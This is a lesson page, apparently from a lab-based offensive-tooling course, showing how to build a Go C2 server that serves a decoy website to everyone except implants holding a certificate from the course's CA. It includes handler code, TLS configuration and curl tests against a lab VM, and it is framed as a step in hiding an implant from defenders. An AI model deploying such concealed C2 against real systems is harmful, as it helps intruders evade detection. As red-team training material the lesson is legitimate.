# L22: Decoy Routing

L21 made the agent binary vanish from disk.
But the server still answers every connection the same way.
A defender who connects to your port sees C2 traffic.
A real implant serves a normal website to everyone except the real agent.

## TLS client certificates

TLS supports mutual authentication.
The server can ask clients to present a certificate.
Go's `tls.Config` has four `ClientAuth` modes:

```text
NoClientCert             server never asks
RequestClientCert        server asks, client may decline
RequireAnyClientCert     server demands a cert, any cert
RequireAndVerifyClientCert  server demands a cert signed by ClientCAs
```

`RequireAndVerifyClientCert` rejects clients at the TLS layer.
The connection drops before your code runs.
You cannot serve a decoy page because there is no HTTP to respond on.

`RequestClientCert` is the key.
The server sends a CertificateRequest message.
Browsers silently respond with an empty certificate list.
TLS 1.3 encrypts the entire handshake after ServerHello, so a network
observer cannot see the CertificateRequest or the client's response.

Three outcomes from the same port:

```text
  client connects
       |
       v
  TLS handshake (RequestClientCert)
       |
       +-- no cert presented -------> serve decoy website
       |
       +-- cert from unknown CA ----> serve decoy website
       |
       +-- cert signed by rklings CA -> C2 channel
```

## Manual certificate verification

With `RequestClientCert`, Go does not verify the client cert automatically.
You must check it yourself in the HTTP handler:

```go
certs := r.TLS.PeerCertificates
if len(certs) == 0 {
    serveDecoy(w, r)
    return
}
```

When a cert is present, verify it against the rklings CA pool:

```go
opts := x509.VerifyOptions{
    Roots: rklingsCAPool,
}
_, err := certs[0].Verify(opts)
if err != nil {
    serveDecoy(w, r)
    return
}
serveC2(w, r)
```

## You write

`main.go` (~80 lines):

- Load the rklings CA certificate into an `x509.CertPool`
- Configure `tls.Config` with `ClientAuth: tls.RequestClientCert`
- HTTP handler that inspects `r.TLS.PeerCertificates`
- Three-way routing: no cert, wrong cert, right cert
- Decoy handler serves a plausible static page
- C2 handler responds to agent commands

## API

```go
import (
    "crypto/tls"
    "crypto/x509"
    "net/http"
    "os"
)

// Load CA cert
caPEM, _ := os.ReadFile("ca.crt")
pool := x509.NewCertPool()
pool.AppendCertsFromPEM(caPEM)

// TLS config
cfg := &tls.Config{
    ClientAuth: tls.RequestClientCert,
    // ClientCAs is NOT set: we verify manually
}

// In handler
r.TLS.PeerCertificates  // []*x509.Certificate, may be empty

opts := x509.VerifyOptions{Roots: pool}
_, err := certs[0].Verify(opts)
```

## Test it

```
$ rklings run l22
```

The lab shows a split view.
Left panel: what a browser sees (the decoy page).
Right panel: what the agent sees (C2 response).

From the VM, test both paths:

```
root@vm:~# curl -k https://10.0.2.2:443/
<html><title>Welcome</title>...          # decoy

root@vm:~# curl -k --cert agent.crt --key agent.key https://10.0.2.2:443/
{"status":"c2","commands":["PING"]}      # C2
```

From the host, a browser hitting https://localhost:443 sees the decoy.
No indication that C2 exists.

## Validate

```
$ rklings validate l22
  [+] server starts with RequestClientCert
  [+] no cert: receives decoy page
  [+] wrong cert: receives decoy page
  [+] rklings CA cert: receives C2 response
  PASS
```

## Next

The server looks innocent to outsiders.
But the agent process still shows its real name in `ps` and its port in `ss`.
L23 makes the agent masquerade as a kernel thread.
